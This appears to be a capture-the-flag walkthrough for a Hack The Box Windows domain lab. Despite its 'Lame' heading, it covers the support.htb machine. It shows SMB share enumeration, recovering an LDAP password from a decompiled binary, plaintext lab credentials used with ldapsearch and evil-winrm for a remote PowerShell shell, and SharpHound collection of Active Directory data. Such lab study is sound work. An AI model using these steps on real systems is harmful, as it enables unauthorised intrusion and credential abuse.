**Lame** 
──(root㉿kali)-[/home/kali]
└─# smbclient -L 10.10.11.227 -N
do_connect: Connection to 10.10.11.227 failed (Error NT_STATUS_HOST_UNREACHABLE)
                                                                                                                                 
┌──(root㉿kali)-[/home/kali]
└─# smbclient -L 10.10.11.174 -N

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	support-tools   Disk      support staff tools
	SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available

  
┌──(root㉿kali)-[/home/kali]
└─# smbclient //10.10.11.174/support-tools
Password for [WORKGROUP\kali]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Jul 20 13:01:06 2022
  ..                                  D        0  Sat May 28 07:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 07:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 07:19:55 2022
  putty.exe                           A  1273576  Sat May 28 07:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 07:19:31 2022
  UserInfo.exe.zip                    A   277499  Wed Jul 20 13:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 07:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 07:19:43 2022

		4026367 blocks of size 4096. 967496 blocks available
                                                           
#download suspicios file   
smb: \> get UserInfo.exe.zip  

#create sperate folder for extaract
──(root㉿kali)-[/home/kali]
└─# unzip UserInfo.exe.zip 
Archive:  UserInfo.exe.zip
  inflating: UserInfo.exe            
  inflating: CommandLineParser.dll   
  inflating: Microsoft.Bcl.AsyncInterfaces.dll  
  inflating: Microsoft.Extensions.DependencyInjection.Abstractions.dll  
  inflating: Microsoft.Extensions.DependencyInjection.dll  
  inflating: Microsoft.Extensions.Logging.Abstractions.dll  
  inflating: System.Buffers.dll      
  inflating: System.Memory.dll       
  inflating: System.Numerics.Vectors.dll  
  inflating: System.Runtime.CompilerServices.Unsafe.dll  
  inflating: System.Threading.Tasks.Extensions.dll  
  inflating: UserInfo.exe.config 

#move this UserInfo.exe to windows machine

#In windows machine

#download dnspy from >> https://github.com/dnSpy/dnSpy/releases
#open UserInfo.exe in dnspy
#anylze for any ldap passwords
#we got encryted password along with encryption techniq
#based on encryted techniq create script python script to decrypt password



┌──(blackdevil㉿kali)-[~/htb-writeups]
└─$ ldapsearch -x -H ldap://10.10.11.174 \
-D 'support\ldap' \
-w 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' \
-b 'dc=support,dc=htb' \
"(cn=support)"

#port 5985 is open so we can possibly get intrective shell we will tool :evil-winrm
#Evil-WinRM is a post-exploitation tool used by attackers or penetration testers to get an interactive PowerShell shell on a remote Windows machine using WinRM (Windows Remote Management).
evil-winrm -i 10.10.11.174 -u support -p 'Ironside47pleasure40Watchful'


#Download Sharphound.exe and save it in attack machine home
#upload Sharphound on taget 
upload /home/kali/SharpHound.exe #run this on target machine shell 
.\SharpHound.exe -C all #run this one target to get the details about what previlagge user support have in system
                        #it will create zip file 20250617085423_BloodHound.zip
#download  20250617085423_BloodHound.zip in kali machine 
#run following command in target machine
download 20250617085423_BloodHound.zip

#in kali open bloodhound 
#if not installed install bloodhound and complete the set up (refer kali.org)

#upload 20250617085423_BloodHound.zip
#then anylize the data
#got DC.SUPPORT.HTB in bloodhound (analize further)
